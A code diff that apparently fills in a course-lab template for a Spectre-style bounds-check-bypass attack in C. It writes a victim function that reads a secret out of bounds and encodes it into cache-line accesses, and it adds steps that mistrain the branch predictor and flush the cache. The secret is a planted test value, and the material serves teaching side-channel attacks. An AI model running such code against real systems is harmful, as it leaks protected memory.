@@ -21,10 +21,16 @@
 int *secret_array;
 int *dummy_array;
 
-void victim_function(int idx, int bound) {
+volatile int bound = BOUND;
+
+void victim_function(int idx) {
+  int secret_data = secret_array[idx];
+  int index = secret_data << 6;
+
+  clflush((void *)&bound);
+
   if (idx < bound) {
-    // TODO: Use secret_array to get addr into dummy_array
-    secret_array[idx * LINE_SIZE] = 1;
+    dummy_array[index] = 1;
   }
 }
 
@@ -50,21 +56,19 @@ int main(int argc, char **argv)
     secret_array = (int *)huge_page;
     dummy_array = (int *)huge_page;
 
-
-    volatile int bound = BOUND;
-    clflush((void *)&bound);
-
     // Initialize the array
     for (int i = 0; i < SECRET_SIZE; i++) {
       secret_array[i*LINE_SIZE] = i;
     }
-    secret_array[(BOUND+BOUND_OFFSET)*LINE_SIZE] = 90; // Suppose the secret value we want is 90.
+
+    int message = BOUND + BOUND_OFFSET;
+    secret_array[message*LINE_SIZE] = 90; // Suppose the secret value we want is 90.
 
     //** STEP 2: Mistrain the branch predictor by calling victim function here */
     // To prevent any kind of patterns, ensure each time you train it a different number of times
 
     for (int i = 0; i < BOUND; i++) {
-      victim_function(i, bound); 
+      victim_function(i); 
     } 
 
     //** STEP 3: Clear cache using clflush from utility.h */
@@ -73,10 +77,8 @@ int main(int argc, char **argv)
     }
 
     //** STEP 4: Call victim function again with bounds bypass value */
-    int message = BOUND + BOUND_OFFSET;
     // secret_array[message * LINE_SIZE] = 1;
-    clflush((void *)&bound);
-    victim_function(message, bound);
+    victim_function(message);
 
     //** STEP 5: Reload mmap to see load times */
     // Just read the mmap's first 100 integers
